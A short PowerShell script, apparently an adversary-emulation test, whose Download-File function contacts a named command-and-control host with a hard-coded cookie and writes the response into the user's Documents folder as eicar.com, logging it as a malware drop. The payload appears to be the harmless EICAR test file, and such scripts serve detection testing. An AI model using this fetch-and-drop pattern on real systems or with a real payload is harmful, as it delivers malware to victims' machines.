# Configure logging for verbose output
$LogPath = "$PSScriptRoot\DGA_Simulation.log"
$LogLevel = "DEBUG"

function Write-Log {
    param (
        [string]$Message,
        [string]$Level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp - $Level - $Message"
    Add-Content -Path $LogPath -Value $logEntry
    if ($Level -eq "ERROR" -or $Level -eq "WARNING" -or $LogLevel -eq "DEBUG") {
        Write-Host $logEntry
    }
}

function Download-File {
    $c2Server = "http://caldera.mfmz.net:5000/get"
    $headers = @{"Cookie"="auth_tokenXX99=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"} # Adding the cookie header
    try {
        $response = Invoke-WebRequest -Uri $c2Server -Headers $headers -UseBasicParsing
        Write-Log -Message "C2 server response: $($response.StatusCode)" -Level "DEBUG"
        if ($response.StatusCode -eq 200) {
            $documentsPath = [System.Environment]::GetFolderPath('MyDocuments')
            $malwarePath = "${documentsPath}\eicar.com"
            $response.Content | Set-Content -Path $malwarePath -Encoding Byte
            Write-Log -Message "Malware file downloaded and placed in the Documents folder." -Level "INFO"
        } else {
            Write-Log -Message "Unexpected response from C2 server: $($response.StatusCode)" -Level "WARNING"
        }
    } catch {
        Write-Log -Message "Failed to communicate with C2 server: $($_.Exception.Message)" -Level "ERROR"
    }
}
